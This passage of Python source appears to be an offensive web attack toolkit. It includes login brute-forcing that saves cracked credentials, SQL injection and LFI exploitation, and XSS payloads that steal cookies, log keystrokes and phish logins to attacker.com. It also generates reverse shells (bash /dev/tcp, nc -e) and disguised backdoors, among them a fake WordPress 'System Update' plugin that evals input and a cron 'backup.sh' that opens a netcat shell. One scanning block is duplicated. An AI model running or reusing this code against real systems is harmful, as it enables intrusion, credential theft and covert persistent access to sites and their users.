        """Test for Open Redirect"""
        print(f"\n{Fore.YELLOW}[*] Testing Open Redirect...")
        
        payloads = [
            "http://evil.com", "https://evil.com",
            "//evil.com", "///evil.com"
        ]
        
        for url in urls[:30]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            redirect_params = [p for p in params if any(x in p.lower() 
                              for x in ['url', 'redirect', 'next', 'goto', 'return'])]
            
            for param in redirect_params:
                for payload in payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", 
                                         f"{param}={quote(payload)}")
                    try:
                        resp = self.session.get(test_url, timeout=self.timeout, 
                                              allow_redirects=False)
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location:
                            vuln = {
                                'type': 'Open Redirect',
                                'severity': 'MEDIUM',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'description': 'Open redirect vulnerability',
                                'exploit': False
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"{Fore.YELLOW}[!] Open Redirect: {url}")
                            break
                    except:
                        pass
    
    def test_wordpress_vulnerabilities(self):
        """Test WordPress specific vulnerabilities"""
        if 'WordPress' not in self.technologies:
            return
        
        print(f"\n{Fore.YELLOW}[*] Testing WordPress Specific Vulnerabilities...")
        
        # Test for user enumeration via author pages
        print(f"{Fore.CYAN}[*] Testing user enumeration...")
        for i in range(1, 6):
            url = urljoin(self.target, f'/?author={i}')
            try:
                resp = self.session.get(url, timeout=5, allow_redirects=True)
                if resp.status_code == 200:
                    username_match = re.search(r'author/([^/]+)/', resp.url)
                    if username_match:
                        username = username_match.group(1)
                        print(f"{Fore.GREEN}[+] Username found: {username}")
            except:
                pass
        
        # Test for plugin vulnerabilities
        print(f"{Fore.CYAN}[*] Checking for known vulnerable plugins...")
        vulnerable_plugins = {
            'wp-file-manager': '6.9',
            'wp-google-maps': '7.11.18',
            'elementor': '2.9.8',
            'contact-form-7': '5.1.6'
        }
        
        for plugin in self.wp_plugins:
            if plugin in vulnerable_plugins:
                print(f"{Fore.RED}[!] Potentially vulnerable plugin: {plugin}")
                vuln = {
                    'type': 'Vulnerable WordPress Plugin',
                    'severity': 'HIGH',
                    'url': urljoin(self.target, f'/wp-content/plugins/{plugin}/'),
                    'plugin': plugin,
                    'description': f'Plugin {plugin} may have known vulnerabilities',
                    'exploit': False
                }
                self.vulnerabilities.append(vuln)
        
        # Test for theme editor access
        print(f"{Fore.CYAN}[*] Testing theme editor access...")
        editor_url = urljoin(self.target, '/wp-admin/theme-editor.php')
        try:
            resp = self.session.get(editor_url, timeout=5)
            if 'wp-login.php' not in resp.url and resp.status_code == 200:
                print(f"{Fore.RED}[!] Theme editor accessible without authentication!")
        except:
            pass
        """Test for Open Redirect"""
        print(f"\n{Fore.YELLOW}[*] Testing Open Redirect...")
        
        payloads = [
            "http://evil.com", "https://evil.com",
            "//evil.com", "///evil.com"
        ]
        
        for url in urls[:30]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            redirect_params = [p for p in params if any(x in p.lower() 
                              for x in ['url', 'redirect', 'next', 'goto', 'return'])]
            
            for param in redirect_params:
                for payload in payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", 
                                         f"{param}={quote(payload)}")
                    try:
                        resp = self.session.get(test_url, timeout=self.timeout, 
                                              allow_redirects=False)
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location:
                            vuln = {
                                'type': 'Open Redirect',
                                'severity': 'MEDIUM',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'description': 'Open redirect vulnerability',
                                'exploit': False
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"{Fore.YELLOW}[!] Open Redirect: {url}")
                            break
                    except:
                        pass
    
    def find_admin_panels(self):
        """Enhanced admin panel finder"""
        print(f"\n{Fore.YELLOW}[*] Searching for Admin Panels...")
        
        admin_paths = [
            "/admin", "/admin/", "/administrator", "/admin/login", "/admin/login.php",
            "/admin/admin.php", "/admin/index.php", "/admin/home.php",
            "/wp-admin", "/wp-login.php", "/adminpanel", "/cpanel", "/controlpanel",
            "/backend", "/dashboard", "/manager", "/moderator", "/webmaster",
            "/admin/dashboard", "/admin/controlpanel", "/admin.php", "/login.php",
            "/user/login", "/signin", "/admin/signin", "/administrator/index.php"
        ]
        
        def check_path(path):
            url = urljoin(self.target, path)
            try:
                resp = self.session.get(url, timeout=5, allow_redirects=False)
                if resp.status_code in [200, 301, 302, 401, 403]:
                    vuln = {
                        'type': 'Admin Panel Found',
                        'severity': 'INFO',
                        'url': url,
                        'status_code': resp.status_code,
                        'description': f'Admin panel accessible (Status: {resp.status_code})',
                        'exploit': True
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"{Fore.GREEN}[+] Admin panel: {url} [{resp.status_code}]")
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_path, admin_paths)
    
    def test_csrf(self, forms):
        """Test for CSRF vulnerabilities"""
        print(f"\n{Fore.YELLOW}[*] Testing CSRF Protection...")
        
        for form_data in forms[:10]:
            form = form_data['form']
            url = form_data['url']
            
            # Check for CSRF tokens
            csrf_found = False
            for inp in form.find_all('input'):
                name = inp.get('name', '').lower()
                if any(x in name for x in ['csrf', 'token', '_token', 'authenticity']):
                    csrf_found = True
                    break
            
            if not csrf_found:
                vuln = {
                    'type': 'CSRF (Cross-Site Request Forgery)',
                    'severity': 'MEDIUM',
                    'url': url,
                    'description': 'No CSRF protection detected in form',
                    'exploit': False
                }
                self.vulnerabilities.append(vuln)
                print(f"{Fore.YELLOW}[!] No CSRF protection: {url}")
    
    def load_wordlist(self, filepath):
        """Load wordlist from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}[-] File not found: {filepath}")
            return []
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading file: {str(e)}")
            return []
    
    def brute_force_login(self, vuln, custom_users=None, custom_passwords=None):
        """Brute force login with common or custom credentials"""
        print(f"\n{Fore.CYAN}[*] Starting Brute Force Attack...")
        
        # Ask for custom wordlists if not using defaults
        if custom_users is None or (custom_users and custom_users[0] != 'default'):
            print(f"\n{Fore.YELLOW}╔════════════════════════════════════════════════════════════╗")
            print(f"{Fore.YELLOW}║          CUSTOM WORDLIST CONFIGURATION                     ║")
            print(f"{Fore.YELLOW}╚════════════════════════════════════════════════════════════╝")
            
            # Load custom username list
            print(f"\n{Fore.CYAN}[*] Username Wordlist Configuration")
            print(f"{Fore.CYAN}    Examples:")
            print(f"{Fore.CYAN}    - /sdcard/usernames.txt")
            print(f"{Fore.CYAN}    - ~/downloads/users.txt")
            print(f"{Fore.CYAN}    - SecLists/Usernames/top-usernames-shortlist.txt")
            
            user_file = input(f"\n{Fore.YELLOW}Enter username wordlist path (or press Enter to skip): ").strip()
            
            if user_file:
                custom_users = self.load_wordlist(user_file)
                if custom_users:
                    print(f"{Fore.GREEN}[+] Loaded {len(custom_users)} usernames")
                    print(f"{Fore.GREEN}[+] Preview: {', '.join(custom_users[:5])}...")
                else:
                    print(f"{Fore.RED}[-] Failed to load usernames")
                    print(f"{Fore.YELLOW}[?] Use built-in default usernames? (y/n): ", end='')
                    if input().strip().lower() != 'y':
                        return False
                    custom_users = None
            else:
                print(f"{Fore.YELLOW}[*] No username list provided, using defaults")
                custom_users = None
            
            # Load custom password list
            print(f"\n{Fore.CYAN}[*] Password Wordlist Configuration")
            print(f"{Fore.CYAN}    Examples:")
            print(f"{Fore.CYAN}    - /sdcard/passwords.txt")
            print(f"{Fore.CYAN}    - ~/downloads/rockyou.txt")
            print(f"{Fore.CYAN}    - SecLists/Passwords/Common-Credentials/10k-most-common.txt")
            
            pass_file = input(f"\n{Fore.YELLOW}Enter password wordlist path (or press Enter to skip): ").strip()
            
            if pass_file:
                custom_passwords = self.load_wordlist(pass_file)
                if custom_passwords:
                    print(f"{Fore.GREEN}[+] Loaded {len(custom_passwords)} passwords")
                    print(f"{Fore.GREEN}[+] Preview: {', '.join(custom_passwords[:5])}...")
                else:
                    print(f"{Fore.RED}[-] Failed to load passwords")
                    print(f"{Fore.YELLOW}[?] Use built-in default passwords? (y/n): ", end='')
                    if input().strip().lower() != 'y':
                        return False
                    custom_passwords = None
            else:
                print(f"{Fore.YELLOW}[*] No password list provided, using defaults")
                custom_passwords = None
        
        # Use custom or default credentials
        if custom_users and custom_passwords:
            print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
            print(f"{Fore.CYAN}║          ATTACK CONFIGURATION                              ║")
            print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝")
            
            total_combinations = len(custom_users) * len(custom_passwords)
            print(f"\n{Fore.CYAN}[*] Usernames: {len(custom_users)}")
            print(f"{Fore.CYAN}[*] Passwords: {len(custom_passwords)}")
            print(f"{Fore.CYAN}[*] Total combinations: {total_combinations:,}")
            
            # Estimate time
            estimated_seconds = total_combinations * 0.5  # 0.5 sec per attempt
            estimated_minutes = estimated_seconds / 60
            print(f"{Fore.YELLOW}[*] Estimated time: ~{estimated_minutes:.1f} minutes")
            
            # Ask for attack strategy
            print(f"\n{Fore.YELLOW}[?] Select attack strategy:")
            print(f"{Fore.GREEN}[1] Full attack (test all combinations)")
            print(f"{Fore.GREEN}[2] Smart mode (limit to 5,000 combinations)")
            print(f"{Fore.GREEN}[3] Quick mode (limit to 1,000 combinations)")
            print(f"{Fore.GREEN}[4] Custom limit")
            
            strategy = input(f"\n{Fore.YELLOW}Choice: ").strip()
            
            if strategy == '2':
                max_attempts = 5000
                limit = int(max_attempts / len(custom_passwords))
                custom_users = custom_users[:limit]
                custom_passwords = custom_passwords[:int(max_attempts / len(custom_users))]
                print(f"{Fore.YELLOW}[*] Limited to {len(custom_users)}×{len(custom_passwords)} = {len(custom_users)*len(custom_passwords)} combinations")
            elif strategy == '3':
                custom_users = custom_users[:20]
                custom_passwords = custom_passwords[:50]
                print(f"{Fore.YELLOW}[*] Limited to {len(custom_users)}×{len(custom_passwords)} = {len(custom_users)*len(custom_passwords)} combinations")
            elif strategy == '4':
                try:
                    max_attempts = int(input(f"{Fore.YELLOW}Enter max attempts: ").strip())
                    limit = int(max_attempts / len(custom_passwords))
                    custom_users = custom_users[:limit]
                    custom_passwords = custom_passwords[:int(max_attempts / len(custom_users))]
                    print(f"{Fore.YELLOW}[*] Limited to {len(custom_users)}×{len(custom_passwords)} combinations")
                except:
                    print(f"{Fore.RED}[-] Invalid input, using smart mode")
                    custom_users = custom_users[:50]
                    custom_passwords = custom_passwords[:100]
            
            credentials = [(u, p) for u in custom_users for p in custom_passwords]
        else:
            print(f"\n{Fore.CYAN}[*] Using built-in default credentials")
            credentials = [
                ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
                ('admin', 'admin123'), ('administrator', 'administrator'),
                ('root', 'root'), ('root', 'toor'), ('admin', ''),
                ('admin', 'Password1'), ('admin', 'admin@123'),
                ('test', 'test'), ('guest', 'guest'), ('user', 'user'),
                ('admin', '12345'), ('admin', 'pass'), ('user', 'password'),
                ('admin', 'passw0rd'), ('admin', 'letmein'), ('admin', 'qwerty')
            ]
        
        # Confirm before starting
        print(f"\n{Fore.RED}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}║  WARNING: This will make {len(credentials)} login attempts         ║")
        print(f"{Fore.RED}║  Target server may block your IP if too many requests     ║")
        print(f"{Fore.RED}╚════════════════════════════════════════════════════════════╝")
        
        confirm = input(f"\n{Fore.YELLOW}Start attack? (yes/no): ").strip().lower()
        if confirm != 'yes':
            print(f"{Fore.RED}[-] Attack cancelled")
            return False
        
        try:
            resp = self.session.get(vuln['url'], timeout=self.timeout)
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form')
            
            if not form:
                print(f"{Fore.RED}[-] No login form found")
                return False
            
            action = form.get('action', '')
            target = urljoin(vuln['url'], action)
            method = form.get('method', 'post').lower()
            
            # Statistics
            total = len(credentials)
            tested = 0
            start_time = time.time()
            
            print(f"\n{Fore.CYAN}[*] Target: {target}")
            print(f"{Fore.CYAN}[*] Method: {method.upper()}")
            print(f"{Fore.CYAN}[*] Total attempts: {total}")
            print(f"{Fore.CYAN}[*] Starting attack...\n")
            
            for username, password in credentials:
                tested += 1
                
                # Progress indicator
                progress = (tested / total) * 100
                print(f"{Fore.CYAN}[{tested}/{total}] ({progress:.1f}%) Trying: {username}:{password[:20]}", end='\r')
                
                data = {}
                for inp in form.find_all('input'):
                    name = inp.get('name', '')
                    inp_type = inp.get('type', '').lower()
                    
                    if any(x in name.lower() for x in ['user', 'email', 'login', 'username']):
                        data[name] = username
                    elif any(x in name.lower() for x in ['pass', 'pwd', 'password']):
                        data[name] = password
                    elif inp_type != 'submit':
                        data[name] = inp.get('value', '')
                
                try:
                    if method == 'post':
                        resp = self.session.post(target, data=data, timeout=self.timeout)
                    else:
                        resp = self.session.get(target, params=data, timeout=self.timeout)
                    
                    # Check success indicators
                    success = ['dashboard', 'welcome', 'logout', 'profile', 'home', 'admin panel', 'logged in']
                    fail = ['invalid', 'incorrect', 'wrong', 'failed', 'error', 'denied']
                    
                    if any(s in resp.text.lower() for s in success) and \
                       not any(f in resp.text.lower() for f in fail):
                        elapsed = time.time() - start_time
                        print(f"\n\n{Fore.GREEN}{'='*70}")
                        print(f"{Fore.GREEN}[+] SUCCESS! Credentials found!")
                        print(f"{Fore.GREEN}[+] Username: {username}")
                        print(f"{Fore.GREEN}[+] Password: {password}")
                        print(f"{Fore.GREEN}[+] Time taken: {elapsed:.2f} seconds")
                        print(f"{Fore.GREEN}[+] Attempts: {tested}/{total}")
                        print(f"{Fore.GREEN}{'='*70}\n")
                        
                        # Save credentials to file
                        try:
                            with open('cracked_credentials.txt', 'a') as f:
                                f.write(f"{vuln['url']}\n")
                                f.write(f"Username: {username}\n")
                                f.write(f"Password: {password}\n")
                                f.write(f"Date: {datetime.now()}\n")
                                f.write("-" * 50 + "\n")
                            print(f"{Fore.GREEN}[+] Credentials saved to: cracked_credentials.txt")
                        except:
                            pass
                        
                        return True
                    
                    time.sleep(0.3)  # Rate limiting - adjust as needed
                    
                except requests.exceptions.Timeout:
                    print(f"\n{Fore.RED}[-] Timeout, continuing...")
                    continue
                except requests.exceptions.ConnectionError:
                    print(f"\n{Fore.RED}[-] Connection error, retrying...")
                    time.sleep(2)
                    continue
                except Exception as e:
                    continue
            
            elapsed = time.time() - start_time
            print(f"\n\n{Fore.RED}{'='*70}")
            print(f"{Fore.RED}[-] Brute force completed - No valid credentials found")
            print(f"{Fore.RED}[-] Tested: {tested} combinations")
            print(f"{Fore.RED}[-] Time: {elapsed:.2f} seconds")
            print(f"{Fore.RED}{'='*70}\n")
            return False
            
        except Exception as e:
            print(f"\n{Fore.RED}[-] Error: {str(e)}")
            return False
    
    def exploit_sql_injection(self, vuln):
        """Advanced SQL injection exploitation"""
        print(f"\n{Fore.CYAN}[*] Exploiting SQL Injection...")
        
        # Try authentication bypass
        bypass_payloads = [
            "admin' OR '1'='1' --",
            "admin' OR 1=1 --",
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'--",
            "' UNION SELECT NULL,NULL,NULL--"
        ]
        
        for payload in bypass_payloads:
            test_url = vuln['url']
            if 'parameter' in vuln:
                test_url = test_url.replace(vuln['payload'], payload)
            
            try:
                resp = self.session.get(test_url, timeout=self.timeout)
                
                success_indicators = [
                    'welcome', 'dashboard', 'logout', 'admin panel',
                    'logged in', 'profile'
                ]
                
                if any(ind in resp.text.lower() for ind in success_indicators):
                    print(f"{Fore.GREEN}[+] SUCCESS! Bypassed with: {payload}")
                    print(f"{Fore.GREEN}[+] Access URL: {test_url}")
                    return True
                else:
                    print(f"{Fore.YELLOW}[-] Failed: {payload}")
            except:
                pass
        
        # Try data extraction
        print(f"\n{Fore.CYAN}[*] Attempting data extraction...")
        extraction_payloads = [
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT null,concat(username,':',password) FROM users--",
            "' UNION SELECT table_name FROM information_schema.tables--"
        ]
        
        for payload in extraction_payloads:
            try:
                test_url = vuln['url'].replace(vuln['payload'], payload)
                resp = self.session.get(test_url, timeout=self.timeout)
                
                if resp.status_code == 200 and len(resp.text) > 100:
                    print(f"{Fore.GREEN}[+] Possible data leak with: {payload}")
                    print(f"{Fore.CYAN}[*] Response size: {len(resp.text)} bytes")
            except:
                pass
        
        return False
    
    def exploit_vulnerability(self, vuln):
        """Route exploitation based on vulnerability type"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"{Fore.YELLOW}[*] Exploiting: {vuln['type']}")
        print(f"{Fore.YELLOW}[*] Severity: {vuln['severity']}")
        print(f"{Fore.YELLOW}[*] Target: {vuln['url']}")
        print(f"{Fore.YELLOW}{'='*60}\n")
        
        if not vuln.get('exploit', False):
            print(f"{Fore.RED}[-] This vulnerability is not exploitable automatically")
            return False
        
        if 'SQL Injection' in vuln['type']:
            return self.exploit_sql_injection(vuln)
        elif vuln['type'] == 'Admin Panel Found':
            # Ask if user wants to use custom wordlist
            print(f"\n{Fore.CYAN}[*] Admin Panel Login Brute Force")
            print(f"{Fore.YELLOW}[?] Select attack mode:")
            print(f"{Fore.GREEN}[1] Use default credentials (quick)")
            print(f"{Fore.GREEN}[2] Load custom wordlist (recommended)")
            print(f"{Fore.GREEN}[0] Skip brute force")
            
            try:
                choice = input(f"\n{Fore.YELLOW}Choice: ").strip()
                
                if choice == '0':
                    print(f"{Fore.YELLOW}[-] Skipping brute force")
                    return False
                elif choice == '2':
                    # Load custom wordlists
                    return self.brute_force_login(vuln, custom_users=None, custom_passwords=None)
                else:
                    # Use default credentials
                    return self.brute_force_login(vuln, custom_users=['default'], custom_passwords=['default'])
            except:
                return False
        elif 'XSS' in vuln['type']:
            print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
            print(f"{Fore.CYAN}║          XSS EXPLOITATION OPTIONS                          ║")
            print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
            
            print(f"{Fore.YELLOW}[?] Select exploitation method:")
            print(f"{Fore.GREEN}[1] Cookie Stealer (get admin cookies)")
            print(f"{Fore.GREEN}[2] Keylogger (capture keystrokes)")
            print(f"{Fore.GREEN}[3] Phishing Page (fake login)")
            print(f"{Fore.GREEN}[4] Advanced LFI Test (if path disclosed)")
            print(f"{Fore.GREEN}[5] Show all payloads")
            print(f"{Fore.GREEN}[0] Skip")
            
            try:
                choice = input(f"\n{Fore.YELLOW}Choice: ").strip()
                
                if choice == '1':
                    return self.exploit_xss_cookie_stealer(vuln)
                elif choice == '2':
                    return self.exploit_xss_keylogger(vuln)
                elif choice == '3':
                    return self.exploit_xss_phishing(vuln)
                elif choice == '4':
                    return self.exploit_lfi_from_xss(vuln)
                elif choice == '5':
                    return self.show_all_xss_payloads(vuln)
                else:
                    print(f"{Fore.YELLOW}[-] Skipped")
                    return False
            except:
                return False
        elif 'LFI' in vuln['type'] or 'Local File Inclusion' in vuln['type']:
            return self.exploit_lfi(vuln)
        else:
            print(f"{Fore.YELLOW}[-] Manual exploitation required")
            return False
    
    def exploit_xss_cookie_stealer(self, vuln):
        """Generate cookie stealing payload"""
        print(f"\n{Fore.CYAN}[*] Cookie Stealer Attack")
        print(f"{Fore.YELLOW}[*] Setup your listener first!\n")
        
        listener_url = input(f"{Fore.YELLOW}Enter your server URL (e.g., http://yourserver.com/steal.php): ").strip()
        
        if not listener_url:
            listener_url = "http://attacker.com/steal.php"
        
        payloads = [
            f"<script>document.location='{listener_url}?c='+document.cookie</script>",
            f"<img src=x onerror=\"fetch('{listener_url}?c='+document.cookie)\">",
            f"<svg/onload=\"navigator.sendBeacon('{listener_url}',document.cookie)\">",
        ]
        
        print(f"\n{Fore.GREEN}[+] Cookie Stealer Payloads:")
        for i, payload in enumerate(payloads, 1):
            print(f"\n{Fore.CYAN}[{i}] {payload}")
        
        print(f"\n{Fore.YELLOW}[*] Listener PHP Code (steal.php):")
        print(f"{Fore.GREEN}")
        print("""<?php
$cookie = $_GET['c'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
$log = "Cookie: $cookie | IP: $ip | Date: $date\\n";
file_put_contents('cookies.txt', $log, FILE_APPEND);
echo "OK";
?>""")
        
        print(f"\n{Fore.CYAN}[*] Insert payload in vulnerable parameter")
        return True
    
    def exploit_xss_keylogger(self, vuln):
        """Generate keylogger payload"""
        print(f"\n{Fore.CYAN}[*] Keylogger Attack")
        
        listener_url = input(f"{Fore.YELLOW}Enter your server URL: ").strip() or "http://attacker.com/log.php"
        
        keylogger_payload = f'''<script>
var keys='';
document.onkeypress=function(e){{
    keys+=e.key;
    if(keys.length>50){{
        fetch('{listener_url}?k='+btoa(keys));
        keys='';
    }}
}}
</script>'''
        
        print(f"\n{Fore.GREEN}[+] Keylogger Payload:")
        print(f"{Fore.CYAN}{keylogger_payload}")
        
        return True
    
    def exploit_xss_phishing(self, vuln):
        """Generate phishing page payload"""
        print(f"\n{Fore.CYAN}[*] Phishing Attack")
        
        phishing_payload = '''<script>
document.body.innerHTML='<h2>Session Expired</h2><form id="f"><input name="user" placeholder="Username"><input type="password" name="pass" placeholder="Password"><button>Login</button></form>';
document.getElementById('f').onsubmit=function(e){
    e.preventDefault();
    fetch('http://attacker.com/steal.php?u='+this.user.value+'&p='+this.pass.value);
    alert('Invalid credentials');
}
</script>'''
        
        print(f"\n{Fore.GREEN}[+] Phishing Payload:")
        print(f"{Fore.CYAN}{phishing_payload}")
        
        return True
    
    def exploit_lfi_from_xss(self, vuln):
        """Test LFI if path was disclosed"""
        print(f"\n{Fore.CYAN}[*] Testing for LFI (Local File Inclusion)")
        print(f"{Fore.YELLOW}[*] Based on error disclosure from XSS\n")
        
        # Extract parameter from URL
        parsed = urlparse(vuln['url'])
        params = parse_qs(parsed.query)
        
        if not params:
            print(f"{Fore.RED}[-] No parameters found in URL")
            return False
        
        # Common LFI payloads
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '/etc/passwd',
            'C:\\windows\\win.ini',
            '../../../wp-config.php',
            '../../config.php',
            '../includes/config.php',
            '/var/www/html/wp-config.php'
        ]
        
        print(f"{Fore.YELLOW}[*] Testing LFI payloads...")
        
        for param_name in params:
            for payload in lfi_payloads:
                test_url = vuln['url'].replace(f"{param_name}=", f"{param_name}={quote(payload)}")
                
                try:
                    resp = self.session.get(test_url, timeout=10)
                    
                    # Check for successful LFI
                    if 'root:' in resp.text or '[extensions]' in resp.text or 'DB_PASSWORD' in resp.text:
                        print(f"\n{Fore.GREEN}{'='*60}")
                        print(f"{Fore.GREEN}[+] LFI SUCCESS!")
                        print(f"{Fore.GREEN}[+] Payload: {payload}")
                        print(f"{Fore.GREEN}[+] URL: {test_url}")
                        print(f"{Fore.GREEN}{'='*60}\n")
                        
                        # Show content preview
                        print(f"{Fore.CYAN}[*] File Content Preview:")
                        print(f"{Fore.YELLOW}{resp.text[:500]}")
                        
                        # Save to file
                        try:
                            filename = f"lfi_dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                            with open(filename, 'w') as f:
                                f.write(f"URL: {test_url}\n")
                                f.write(f"Payload: {payload}\n")
                                f.write("="*60 + "\n")
                                f.write(resp.text)
                            print(f"\n{Fore.GREEN}[+] Full content saved to: {filename}")
                        except:
                            pass
                        
                        return True
                    
                    print(f"{Fore.CYAN}[-] Payload failed: {payload[:30]}", end='\r')
                except:
                    pass
        
        print(f"\n{Fore.RED}[-] LFI exploitation failed")
        return False
    
    def show_all_xss_payloads(self, vuln):
        """Show comprehensive XSS payload list"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          COMPREHENSIVE XSS PAYLOAD LIST                    ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        payloads = {
            'Basic': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
            ],
            'Bypass Filters': [
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<img src=x onerror=\"alert('XSS')\">",
                "<svg/onload=\"alert('XSS')\">",
                "<iframe src=javascript:alert('XSS')>",
            ],
            'Cookie Stealing': [
                "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>",
                "<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>",
            ],
            'Redirect': [
                "<script>window.location='http://attacker.com'</script>",
                "<meta http-equiv='refresh' content='0;url=http://attacker.com'>",
            ],
            'Advanced': [
                "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
                "<script src=//attacker.com/xss.js></script>",
                "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://attacker.com/xss.js\\';document.body.appendChild(a)')",
            ]
        }
        
        for category, payload_list in payloads.items():
            print(f"{Fore.YELLOW}[{category}]")
            for payload in payload_list:
                print(f"{Fore.GREEN}  • {payload}")
            print()
        
        print(f"{Fore.CYAN}[*] Test URL: {vuln['url']}")
        print(f"{Fore.CYAN}[*] Replace parameter value with payloads above\n")
        
        return True
    
    def generate_reverse_shell(self):
        """Generate reverse shell payloads"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          REVERSE SHELL GENERATOR                           ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.YELLOW}[?] Enter your IP address:")
        ip = input(f"{Fore.GREEN}IP: ").strip() or "10.10.10.10"
        
        print(f"{Fore.YELLOW}[?] Enter port to listen on:")
        port = input(f"{Fore.GREEN}Port: ").strip() or "4444"
        
        shells = {
            'PHP': f'''<?php
$sock=fsockopen("{ip}",{port});
exec("/bin/sh -i <&3 >&3 2>&3");
?>''',
            
            'PHP (Short)': f"<?php system('bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"'); ?>",
            
            'Python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            
            'Bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            
            'Netcat': f"nc -e /bin/sh {ip} {port}",
            
            'Perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            
            'Ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        }
        
        print(f"\n{Fore.GREEN}{'='*70}")
        print(f"{Fore.GREEN}[+] REVERSE SHELL PAYLOADS GENERATED")
        print(f"{Fore.GREEN}{'='*70}\n")
        
        for lang, shell in shells.items():
            print(f"{Fore.YELLOW}[{lang}]")
            print(f"{Fore.CYAN}{shell}\n")
        
        print(f"{Fore.YELLOW}[*] Setup listener first:")
        print(f"{Fore.GREEN}nc -lvnp {port}")
        print(f"\n{Fore.YELLOW}[*] Then execute payload on target")
        
        # Save to file
        with open('reverse_shells.txt', 'w') as f:
            f.write(f"IP: {ip}\n")
            f.write(f"Port: {port}\n")
            f.write("="*70 + "\n\n")
            for lang, shell in shells.items():
                f.write(f"[{lang}]\n{shell}\n\n")
        
        print(f"\n{Fore.GREEN}[+] Shells saved to: reverse_shells.txt")
    
    def generate_backdoor(self):
        """Generate persistent backdoor"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          BACKDOOR GENERATOR                                ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.YELLOW}[?] Select backdoor type:")
        print(f"{Fore.GREEN}[1] PHP Web Shell")
        print(f"{Fore.GREEN}[2] WordPress Plugin Backdoor")
        print(f"{Fore.GREEN}[3] .htaccess Backdoor")
        print(f"{Fore.GREEN}[4] Cron Job Backdoor")
        
        choice = input(f"\n{Fore.YELLOW}Choice: ").strip()
        
        if choice == '1':
            # PHP Web Shell
            shell = '''<?php
@error_reporting(0);
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
}
?>
<form method=GET><input name=cmd><input type=submit value=Execute></form>
<form method=POST enctype=multipart/form-data><input type=file name=file><input type=submit value=Upload></form>'''
            
            filename = 'shell.php'
            
        elif choice == '2':
            # WordPress Plugin Backdoor
            shell = '''<?php
/*
Plugin Name: System Update
Description: System maintenance plugin
Version: 1.0
*/

add_action('wp_head', 'check_system');
function check_system(){
    if(isset($_GET['sys'])){
        eval(base64_decode($_GET['sys']));
    }
}
?>'''
            filename = 'wp-system.php'
            
        elif choice == '3':
            # .htaccess Backdoor
            shell = '''# System Configuration
AddType application/x-httpd-php .jpg
# Execute PHP in images'''
            filename = '.htaccess'
            
        elif choice == '4':
            # Cron Job
            shell = '''#!/bin/bash
# System backup script
while true; do
    nc -e /bin/bash ATTACKER_IP 4444
    sleep 3600
done'''
            filename = 'backup.sh'
        else:
            print(f"{Fore.RED}[-] Invalid choice")
            return
        
        print(f"\n{Fore.GREEN}{'='*70}")
        print(f"{Fore.GREEN}[+] BACKDOOR GENERATED: {filename}")
        print(f"{Fore.GREEN}{'='*70}\n")
